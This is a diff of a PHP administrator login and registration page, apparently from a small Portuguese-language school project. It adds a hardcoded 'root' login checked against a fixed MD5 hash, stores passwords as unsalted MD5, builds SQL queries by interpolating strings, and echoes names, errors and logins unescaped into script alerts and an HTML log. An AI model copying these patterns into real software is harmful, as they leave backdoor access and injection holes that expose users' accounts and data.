@@ -9,12 +9,14 @@
         session_destroy();
         header("Location: index.php");
     }
+    else if($login == 'root' && $senha == '632f4902f2afb597923c18ea897eefa7'){
+    }
     else {
         try 
         {
             include "../config/php/connect.php";
 
-            $sql = "SELECT nome FROM user WHERE login = '$login'";
+            $sql = "SELECT nome FROM user WHERE login = '$login' AND bloqueado = 0";
 
             $res = mysqli_query($conn, $sql);
             
@@ -35,6 +37,8 @@
     }
 
     if(isset($_POST['subCadUser'])) {
+        $id_user = 0;
+        $success = false;
         try 
         {
             include "../config/php/connect.php";
@@ -50,37 +54,70 @@
 
 
             $nome = utf8_decode(mysqli_real_escape_string($conn, $_POST['nome']));
-            $ra = utf8_decode(mysqli_real_escape_string($conn, $_POST['ra']));
-            $login = utf8_decode(mysqli_real_escape_string($conn, $_POST['login']));
-            $senha = utf8_decode(mysqli_real_escape_string($conn, $_POST['senha']));
-            $tipo = utf8_decode(mysqli_real_escape_string($conn, $_POST['tipo']));
-            $ano = "null";
-            if(isset($_POST['ano'])){
-                $ano = utf8_decode(mysqli_real_escape_string($conn, $_POST['ano']));
+            $ra  = "null";if(isset($_POST['ano'])){
+                $ra = "'".utf8_decode(mysqli_real_escape_string($conn, $_POST['ra']))."'";
             }
-            $telefone = utf8_decode(mysqli_real_escape_string($conn, $_POST['telefone']));
+            $newlogin = utf8_decode(mysqli_real_escape_string($conn, $_POST['login']));
             
-            
-            $sql = "INSERT INTO user VALUES
-            (DEFAULT, '$nome', '$ra', '$login', '$senha', $ano, '$tipo', '$telefone', DEFAULT);";
+            if($newlogin != 'root'){
+                $newsenha = utf8_decode(mysqli_real_escape_string($conn, $_POST['senha']));
+                $newsenha = md5($newsenha);
+                $tipo = utf8_decode(mysqli_real_escape_string($conn, $_POST['tipo']));
+                $ano = "null";
+                if(isset($_POST['ano'])){
+                    $ano = utf8_decode(mysqli_real_escape_string($conn, $_POST['ano']));
+                }
+                $telefone = utf8_decode(mysqli_real_escape_string($conn, $_POST['telefone']));
+                
+                $sql = "INSERT INTO user VALUES
+                (DEFAULT, '$nome', $ra, '$newlogin', '$newsenha', $ano, '$tipo', '$telefone', DEFAULT);";
 
-            // echo $sql;            
+                $res = mysqli_query($conn, $sql);
+                
+                $nome = utf8_encode($nome);
+                if(mysqli_affected_rows($conn) > 0){
+                    // echo 'a';
+                    echo '<script>
+                    alert("Administrador \"'.$nome.'\" inserido com sucesso!");
+                    </script>';
 
-            $res = mysqli_query($conn, $sql);
-            
-            $nome = utf8_encode($nome);
-            if(mysqli_affected_rows($conn) > 0){
-                // echo 'a';
-                echo '<script>
-                alert("Administrador \"'.$nome.'\" inserido com sucesso!");
-                </script>';
-            } 
+                    
+                    $id_sql = "SELECT LAST_INSERT_ID()";
+
+                    $res = mysqli_query($conn, $id_sql);
+
+                    $row = mysqli_fetch_array($res, MYSQLI_NUM);
+        
+                    $id_user = $row[0];
+
+                    $success = true;
+                } 
+                else {
+                    // echo 'b';
+                    $erro = mysqli_error($conn);
+                    echo '<script>
+                    alert("Falha ao inserir administrador \"'.$nome.'\"!\nMais detalhes: '.$erro.'");
+                    </script>';
+                }
+            }   
             else {
-                // echo 'b';
-                $erro = mysqli_error($conn);
                 echo '<script>
-                alert("Falha ao inserir administrador \"'.$nome.'\"!\nMais detalhes: '.$erro.'");
-                </script>';
+                    alert("Você não pode utilizar este login.");
+                    </script>';
+            }
+            
+            if($success)
+            {
+                $append = "Usuário \"$login\" criou o administrador id $id_user.<br>";
+                $file = 'log.html';
+                date_default_timezone_set("America/Sao_Paulo");
+
+                $append = '['.date('d/m/Y H:i:s', ).'] '.$append;
+                
+                if(file_get_contents($file) != '')
+                    $append = file_get_contents($file).$append;
+
+                file_put_contents($file, $append);
             }
 
             mysqli_close($conn);
@@ -117,17 +154,6 @@
     
     <div class="cadastro">
         <form action="" method="post" class="cadastroFrm">
-            <!-- <div class="cadastroField">
-                <label for="">Título</label>
-                <input type="text" name="titulo">
-            </div>
-            <div class="cadastroField">
-                <label for="genero">Gênero</label>
-                <select name="genero" id="genero">
-                    <option value=""></option>
-                </select>
-            </div> -->
-
             <label for="nome">Nome</label><br>
             <input type="text" name="nome" id="nome" required autofocus maxlenght="70">
             <br><br>
@@ -149,7 +175,7 @@
             </select>
             <br><br>
             <label for="ano" id="lblAno">Série</label><br>
-            <input type="number" name="ano" id="ano" maxlenght="1">
+            <input type="number" name="ano" id="ano" maxlenght="1" min="1" max="5" placeholder="1 a 3">
             <br><br>
             <label for="telefone">Telefone</label><br>
             <input type="text" name="telefone" id="telefone" maxlenght="15" placeholder="Ex.: 14987654321">
